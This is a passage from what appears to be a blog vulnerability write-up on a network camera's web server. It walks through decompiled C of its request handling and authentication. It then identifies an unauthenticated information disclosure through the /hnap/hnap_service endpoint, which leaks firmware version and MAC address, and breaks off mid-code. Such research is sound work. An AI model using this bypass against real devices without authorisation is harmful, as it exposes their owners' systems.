class="string">"503 Service Not Available\\r\\nFirmware Upgrading Please Wait\\r\\n"</span>;</span><br><span class="line">      v17 = v39;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        v18 = *((_DWORD *)v16 + <span class="number">1</span>);</span><br><span class="line">        v19 = *((_DWORD *)v16 + <span class="number">2</span>);</span><br><span class="line">        v20 = *((_DWORD *)v16 + <span class="number">3</span>);</span><br><span class="line">        *(_DWORD *)v17 = *(_DWORD *)v16;</span><br><span class="line">        *((_DWORD *)v17 + <span class="number">1</span>) = v18;</span><br><span class="line">        *((_DWORD *)v17 + <span class="number">2</span>) = v19;</span><br><span class="line">        *((_DWORD *)v17 + <span class="number">3</span>) = v20;</span><br><span class="line">        v16 += <span class="number">16</span>;</span><br><span class="line">        v17 += <span class="number">16</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( v16 != <span class="string">"ease Wait\\r\\n"</span> );</span><br><span class="line">      v21 = *(_DWORD *)v16;</span><br><span class="line">      v22 = *((_DWORD *)v16 + <span class="number">1</span>);</span><br><span class="line">      v23 = *((_DWORD *)v16 + <span class="number">2</span>);</span><br><span class="line">      *(_DWORD *)v17 = v21;</span><br><span class="line">      *((_DWORD *)v17 + <span class="number">1</span>) = v22;</span><br><span class="line">      *((_DWORD *)v17 + <span class="number">2</span>) = v23;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v39[<span class="number">60</span>], <span class="number">0</span>, <span class="number">0xC4</span>u);</span><br><span class="line">      v24 = v35[<span class="number">8</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v24</span><br><span class="line">        &amp;&amp; (!<span class="built_in">strcmp</span>(v35[<span class="number">8</span>], <span class="string">"/cgi/finish.cgi"</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v24, <span class="string">"/cgi/admin/finish.cgi"</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v24, <span class="string">"/cgi/maker/finish.cgi"</span>)) )</span><br><span class="line">      {</span><br><span class="line">        skPrint(fd, <span class="string">"HTTP/1.1 200\\r\\n"</span>);</span><br><span class="line">        skPrint(fd, <span class="string">"Content-Type: text/plain\\r\\n"</span>);</span><br><span class="line">        skPrint(fd, <span class="string">"Content-Length: %d\\r\\n\\r\\n"</span>, <span class="number">10</span>);</span><br><span class="line">        skPrint(fd, <span class="string">"finish=%d\\r\\n"</span>, v38);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"finish=%d (response by httpd)\\n"</span>, v38);</span><br><span class="line">        sub_401950(<span class="number">0</span>);</span><br><span class="line">        reqFree(v35);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      }</span><br><span class="line">      skPrint(fd, <span class="string">"HTTP/1.1 503\\r\\n"</span>);</span><br><span class="line">      skPrint(fd, <span class="string">"Content-Type: text/plain\\r\\n"</span>);</span><br><span class="line">      v25 = <span class="built_in">strlen</span>(v39);</span><br><span class="line">      skPrint(fd, <span class="string">"Content-Length: %d\\r\\n\\r\\n"</span>, v25);</span><br><span class="line">      skPrint(fd, <span class="string">"%s"</span>, v39);</span><br><span class="line">      sub_401950(<span class="number">0</span>);</span><br><span class="line">      reqFree(v35);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a9, <span class="string">"127.0.0.1"</span>) )</span><br><span class="line">      v26 = sub_401C2C(<span class="number">0</span>, v35, v36, a9) + <span class="number">414</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v26 = sub_401C2C(a2, v35, v36, a9);</span><br><span class="line">    v27 = a9;</span><br><span class="line">    <span class="keyword">switch</span> ( v26 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-414</span>:</span><br><span class="line">        sub_402898(v35, <span class="string">"414.html"</span>, <span class="string">"414"</span>, *(_DWORD *)*v35);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-413</span>:</span><br><span class="line">        sub_402898(v35, <span class="string">"413.html"</span>, <span class="string">"413"</span>, *(_DWORD *)*v35);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-412</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-411</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-410</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-409</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-408</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-407</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-406</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-405</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-402</span>:</span><br><span class="line">        v27 = a9;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-404</span>:</span><br><span class="line">        sub_402898(v35, <span class="string">"404.html"</span>, <span class="string">"404"</span>, *(_DWORD *)*v35);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-403</span>:</span><br><span class="line">        sub_402898(v35, <span class="string">"403.html"</span>, <span class="string">"403"</span>, *(_DWORD *)*v35);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-401</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !**((_BYTE **)*v35 + <span class="number">8</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">        sub_402E20(a9, <span class="number">1</span>);</span><br><span class="line">        sub_401B6C(a9, &amp;v37);</span><br><span class="line">        <span class="keyword">if</span> ( v37 &lt; <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_61;</span><br><span class="line">        sub_402898(v35, <span class="string">"401.html"</span>, <span class="string">"200"</span>, *(_DWORD *)*v35);</span><br><span class="line">        sub_402E20(a9, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_42:</span><br><span class="line">        sub_402E20(v27, <span class="number">0</span>);</span><br><span class="line">        v28 = v35;</span><br><span class="line">        v43 = (<span class="type">char</span> *)v35[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v43, v41) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_64;</span><br><span class="line">        v29 = v28[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v29, v42)</span><br><span class="line">          || !<span class="built_in">strcmp</span>(v29, v44)</span><br><span class="line">          || !<span class="built_in">strcmp</span>(v29, v45)</span><br><span class="line">          || !<span class="built_in">strcmp</span>(v29, v46)</span><br><span class="line">          || !<span class="built_in">strncmp</span>(v29, v47, <span class="number">0x10</span>u) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">goto</span> LABEL_64;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v29, <span class="string">"/videostorage/"</span>, <span class="number">0xE</span>u) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v29, <span class="string">"/greece/"</span>, <span class="number">8u</span>) )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v43, <span class="string">".asp"</span>) )</span><br><span class="line">            {</span><br><span class="line">              sub_402898(v28, v28[<span class="number">7</span>], <span class="string">"200"</span>, *(_DWORD *)*v28);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">              v34 = hoInit(v28);</span><br><span class="line">              <span class="keyword">if</span> ( aspLoad(v28[<span class="number">7</span>], v34, v28[<span class="number">1</span>], v36) &gt;= <span class="number">0</span> )</span><br><span class="line">              {</span><br><span class="line">                sub_4025F8(*(_DWORD *)*v28, <span class="string">"200"</span>, <span class="string">".asp"</span>, v28[<span class="number">8</span>]);</span><br><span class="line">                hoFree(v34, fd, dword_422C8C &amp; <span class="number">4</span>);</span><br><span class="line">              }</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              {</span><br><span class="line">                sub_402898(v28, <span class="string">"404.html"</span>, <span class="string">"404"</span>, *(_DWORD *)*v28);</span><br><span class="line">                hoFree(v34, <span class="number">0</span>, dword_422C8C &amp; <span class="number">4</span>);</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          {</span><br><span class="line">LABEL_64:</span><br><span class="line">            sub_402040(&amp;v35, a4, v36);</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">memset</span>(v39, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v35[<span class="number">1</span>] )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">        <span class="built_in">memset</span>(v40, <span class="number">0</span>, <span class="number">512</span>);</span><br><span class="line">        <span class="built_in">snprintf</span>(v40, <span class="number">0x200</span>u, format, v35[<span class="number">1</span>]);</span><br><span class="line">        v30 = <span class="built_in">strstr</span>(v40, <span class="string">"access_token="</span>);</span><br><span class="line">        v31 = a9;</span><br><span class="line">        <span class="keyword">if</span> ( v30 )</span><br><span class="line">        {</span><br><span class="line">          v32 = v30 + <span class="number">13</span>;</span><br><span class="line">          v33 = <span class="built_in">strchr</span>(v30 + <span class="number">13</span>, <span class="number">38</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v33 )</span><br><span class="line">            *v33 = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">snprintf</span>(v39, <span class="number">0x10</span>u, format, v32);</span><br><span class="line">LABEL_57:</span><br><span class="line">          v31 = a9;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v31, <span class="string">"127.0.0.1"</span>)</span><br><span class="line">          &amp;&amp; checkToken_localrecording(a9, v39) == <span class="number">-1</span></span><br><span class="line">          &amp;&amp; checkToken_localrecording(a9, *((_DWORD *)*v35 + <span class="number">16</span>)) == <span class="number">-1</span> )</span><br><span class="line">        {</span><br><span class="line">LABEL_61:</span><br><span class="line">          sub_402898(v35, <span class="string">"401.html"</span>, <span class="string">"401"</span>, *(_DWORD *)*v35);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          sub_402898(v35, v35[<span class="number">7</span>], <span class="string">"200"</span>, *(_DWORD *)*v35);</span><br><span class="line">        }</span><br><span class="line">LABEL_70:</span><br><span class="line">        <span class="keyword">if</span> ( byte_422418[<span class="number">0</span>] &amp;&amp; !*(_DWORD *)*v35 &amp;&amp; <span class="built_in">strstr</span>(v35[<span class="number">8</span>], byte_422418) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>The function is very long and important, it does a lot of things.</p><p>First call the <code>reqInit()</code> function to initialize the request, then call the <code>sub_401C2C()</code> function to handle requests, and do different processing according to the return value.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_401C2C</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> **a2, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// dc</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">size_t</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">size_t</span> v13; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $s3</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">v18</span>;</span> <span class="comment">// [sp+20h] [-124h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [sp+B8h] [-8Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v20[<span class="number">64</span>]; <span class="comment">// [sp+BCh] [-88h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v21[<span class="number">72</span>]; <span class="comment">// [sp+FCh] [-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = atoi(*((<span class="type">const</span> <span class="type">char</span> **)*a2 + <span class="number">12</span>)) &gt;= <span class="number">0xD00001</span>;<span class="comment">// Content-Length</span></span><br><span class="line">  result = <span class="number">-414</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  v8 = a2[<span class="number">7</span>];                                   <span class="comment">// url</span></span><br><span class="line">  result = <span class="number">-404</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  v9 = <span class="built_in">strlen</span>(a2[<span class="number">5</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v8, a2[<span class="number">5</span>], v9) &amp;&amp; <span class="built_in">strncmp</span>(v8, <span class="string">"/mnt/storage"</span>, <span class="number">0xC</span>u) &amp;&amp; <span class="built_in">strncmp</span>(v8, <span class="string">"/var/tmp/device"</span>, <span class="number">0xF</span>u) )</span><br><span class="line">  {</span><br><span class="line">    v10 = <span class="built_in">strncmp</span>(v8, <span class="string">"/var/tmp/mpegts"</span>, <span class="number">0xF</span>u);</span><br><span class="line">    v11 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( !v10 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    v6 = <span class="built_in">strncmp</span>(v8, <span class="string">"/mnt/storage/local_recording"</span>, <span class="number">0x1C</span>u) != <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">-404</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  v11 = v8;</span><br><span class="line">LABEL_9:</span><br><span class="line">  v6 = stat(v11, &amp;v18) != <span class="number">0</span>;</span><br><span class="line">  result = <span class="number">-404</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">if</span> ( v18.st_blocks &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-404</span>;</span><br><span class="line">  v12 = v18.st_nlink &amp; <span class="number">0xF000</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 == <span class="number">0x8000</span> || (v6 = v12 != <span class="number">40960</span>, result = <span class="number">-404</span>, !v6) )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">memset</span>(v20, <span class="number">0</span>, <span class="keyword">sizeof</span>(v20));</span><br><span class="line">        <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">        cfgRead(<span class="string">"USER_ADMIN"</span>, <span class="string">"Username1"</span>, v20);</span><br><span class="line">        cfgRead(<span class="string">"USER_ADMIN"</span>, <span class="string">"Password1"</span>, v21);</span><br><span class="line">        usrEncBasic(v20, v21, a3);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v13 = <span class="built_in">strlen</span>(a2[<span class="number">5</span>]);</span><br><span class="line">    v14 = a2[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v14, <span class="string">"/var/tmp/device"</span>, <span class="number">0xF</span>u) || !<span class="built_in">strncmp</span>(v14, <span class="string">"/mnt/storage/local_recording"</span>, <span class="number">0x1C</span>u) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v14, <span class="string">"/var/tmp/mpegts"</span>, <span class="number">0xF</span>u) )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v14, <span class="string">"/mnt/storage"</span>, <span class="number">0xC</span>u) )</span><br><span class="line">        v13 = <span class="number">12</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v13 = <span class="number">15</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( dword_422C90 &amp;&amp; (v15 = a2[<span class="number">9</span>]) != <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">return</span> usrAuth(v15, &amp;v14[v13], *((_DWORD *)*a2 + <span class="number">5</span>), a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v19 = <span class="number">0</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      v17 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v17;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a2[<span class="number">8</span>], &amp;aImage2JpegCgi[<span class="number">128</span> * v16]) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v16 = v17;</span><br><span class="line">        <span class="keyword">if</span> ( v17 == <span class="number">11</span> )</span><br><span class="line">        {</span><br><span class="line">          usrAuth(*((_DWORD *)*a2 + <span class="number">8</span>), &amp;a2[<span class="number">7</span>][v13], *((_DWORD *)*a2 + <span class="number">5</span>), a3);</span><br><span class="line">          v19 = <span class="number">0</span>;</span><br><span class="line">          cfgRead(<span class="string">"HTTP"</span>, <span class="string">"Authenticate"</span>, &amp;v19);</span><br><span class="line">          <span class="keyword">return</span> usrAuthByAuthenticate(*((_DWORD *)*a2 + <span class="number">8</span>), &amp;a2[<span class="number">7</span>][v13], *((_DWORD *)*a2 + <span class="number">5</span>), a3);</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> usrAuthByAuthenticate(*((_DWORD *)*a2 + <span class="number">8</span>), &amp;a2[<span class="number">7</span>][v13], *((_DWORD *)*a2 + <span class="number">5</span>), a3);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>If requested Content-Length ≥ 13631489, return 414.</p><p>If url is empty, return 404.</p><p>If it is a whitelist, return 0.</p><p>If file does not exist, return 404.</p><p>Different validations are determined according to the values of a1 and a3.</p><ul><li>If a1 == 0 &amp;&amp; a3 ≠ 0<ul><li>Encrypt username and password with base64</li></ul></li><li>if a1 == 0 &amp;&amp; a3 == 0<ul><li>return 0</li></ul></li></ul><p>If url is not whitelist.</p><ul><li>Authenticate</li><li>return status code</li></ul><p>Call the corresponding case according to the return status code.</p><p>If the status code is equal to 200.</p><ul><li><p>if request is scheduled</p><ul><li>execute <code>sub_402040</code> function</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_402040</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *<span class="type">const</span> *Env; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> *<span class="type">const</span> *Arg; <span class="comment">// $s3</span></span><br><span class="line"></span><br><span class="line">  Env = (<span class="type">char</span> *<span class="type">const</span> *)reqMakeEnv(*a1, fd, a2, a3);</span><br><span class="line">  Arg = (<span class="type">char</span> *<span class="type">const</span> *)reqMakeArg(*a1);</span><br><span class="line">  <span class="keyword">if</span> ( dup(fd) || dup(fd) != <span class="number">1</span> )</span><br><span class="line">    logx(<span class="number">3</span>, <span class="string">"%s %s %d"</span>, <span class="string">"httpd.c"</span>, <span class="string">"runcgi"</span>, <span class="number">823</span>);</span><br><span class="line">  fcntl(fd, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">  execve(*(<span class="type">const</span> <span class="type">char</span> **)(*a1 + <span class="number">28</span>), Arg, Env);</span><br><span class="line">  sub_401950();</span><br><span class="line">  reqFree(*a1);</span><br><span class="line">  <span class="keyword">return</span> logx(<span class="number">3</span>, <span class="string">"%s %s %d"</span>, <span class="string">"httpd.c"</span>, <span class="string">"runcgi"</span>, <span class="number">830</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>call the execve function to execute</p></li><li><p>if request is .asp</p><ul><li>execute asp function</li></ul></li></ul><p>During the response, the <code>access_token</code> will be checked, if the access_token is wrong, it will be 401. Call <code>checkToken_localrecording()</code> for access control.</p><p>In the above analysis, it was found that there is a hnap service.</p><p>hnap service is a very old protocol, d-link began to deprecate this protocol in 2016, so many bugs happen here.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><h3 id="Unauthenticated-Information-Disclosure"><a href="#Unauthenticated-Information-Disclosure" class="headerlink" title="Unauthenticated Information Disclosure"></a>Unauthenticated Information Disclosure</h3><p>In the above analysis, there is a very interesting code snippet.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_403038</span><span class="params">(<span class="type">int</span> live, <span class="type">int</span> authtype, <span class="type">int</span> pid, <span class="type">int</span> port)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">v37 = <span class="string">"/fvcgi/storage/localstorage_download.ts"</span>;</span><br><span class="line">v39 = <span class="string">"/onvif/onvif_service"</span>;</span><br><span class="line">v40 = <span class="string">"/cam/webapi_service"</span>;</span><br><span class="line">v41 = <span class="string">"/hnap/hnap_service"</span>;</span><br><span class="line">v42 = <span class="string">"/localrecording/"</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v24, v37)</span><br><span class="line">          || !<span class="built_in">strcmp</span>(v24, v39)</span><br><span class="line">          || !<span class="built_in">strcmp</span>(v24, v40)</span><br><span class="line">          || !<span class="built_in">strcmp</span>(v24, v41)</span><br><span class="line">          || !<span class="built_in">strncmp</span>(v24, v42, <span class="number">0x10</span>u) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">goto</span> LABEL_64;</span><br><span class="line">        }</span><br><span class="line">......</span><br><span class="line">LABEL_64:</span><br><span class="line">            sub_402040((<span class="type">char</span> *)&amp;v6 + <span class="number">5</span>, port, v31);</span><br><span class="line">          }</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v26, <span class="string">"127.0.0.1"</span>)</span><br><span class="line">          &amp;&amp; checkToken_localrecording(v46, v34) == <span class="number">-1</span></span><br><span class="line">          &amp;&amp; checkToken_localrecording(v46, *(_DWORD *)(*(_DWORD *)v6 + <span class="number">64</span>)) == <span class="number">-1</span> )</span><br><span class="line">        {</span><br><span class="line">.......</span><br></pre></td></tr></tbody></table></figure><p>If url is <code>/hnap/hnap_service</code> , it will go to LABEL_64, LABEL_64 call <code>sub_402040</code> function,  <code>sub_402040</code> function use execve function to call <code>hnap_service</code> cgi program.</p><p>But after execution is over,  <code>checkToken_localrecording()</code> will be called for access control. So <code>hnap_service</code> can be used without authentication.</p><p>If you access <code>hnap_service</code> with a GET request, the <code>GetDeviceSettings</code> function will be called.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">....</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, <span class="string">"GET"</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="keyword">sizeof</span>(v25));</span><br><span class="line">    v18 = sub_4021EC(<span class="number">0</span>, <span class="string">"GetDeviceSettings"</span>, <span class="number">0</span>);</span><br><span class="line">    v14 = v18;</span><br><span class="line">    <span class="keyword">if</span> ( !v18 )</span><br><span class="line">    {</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">    }</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>The <code>GetDeviceSettings</code> function will output import informations such as  <code>FirmwareVersion/MacAddr</code> and so on.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 